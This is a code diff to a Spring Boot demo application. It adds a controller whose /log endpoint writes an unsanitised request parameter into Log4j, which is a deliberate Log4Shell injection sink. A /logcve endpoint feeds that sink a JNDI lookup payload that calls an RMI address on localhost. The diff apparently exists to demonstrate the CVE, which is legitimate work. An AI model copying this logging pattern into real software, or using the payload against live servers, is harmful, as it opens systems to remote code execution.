@@ -18,6 +18,9 @@ package org.moussaud.demos.cnb.springboot;
 
 import lombok.Getter;
 import lombok.RequiredArgsConstructor;
+
+import org.apache.logging.log4j.Logger;
+import org.apache.logging.log4j.LogManager;
 import org.springframework.boot.SpringApplication;
 import org.springframework.boot.autoconfigure.SpringBootApplication;
 import org.springframework.boot.context.properties.ConfigurationProperties;
@@ -27,6 +30,7 @@ import org.springframework.context.ApplicationContext;
 import org.springframework.http.MediaType;
 import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.RestController;
 
 import java.util.Map;
@@ -76,6 +80,27 @@ class GreetingsController {
     @GetMapping(value = "/greetings", produces = MediaType.TEXT_PLAIN_VALUE)
     String greetings() {
         return props.getMessage();
+    }
+}
+
+@RestController
+@RequiredArgsConstructor
+class LoggingController {
+
+    
+    private static final Logger logger = LogManager.getLogger(LoggingController.class);
+
+    @GetMapping(value = "/log", produces = MediaType.TEXT_PLAIN_VALUE)
+    String log(@RequestParam(value = "message", defaultValue = "HelloWorld") String message) {
+        String logmgs = "message is " + message;
+        logger.error("Running ${java:runtime} ");
+        logger.error(logmgs);
+        return logmgs;
+    }
+
+    @GetMapping(value = "/logcve", produces = MediaType.TEXT_PLAIN_VALUE)
+    String cve() {
+        return log("${jndi:rmi://127.0.0.1:9898/a})");
     }
 }
 
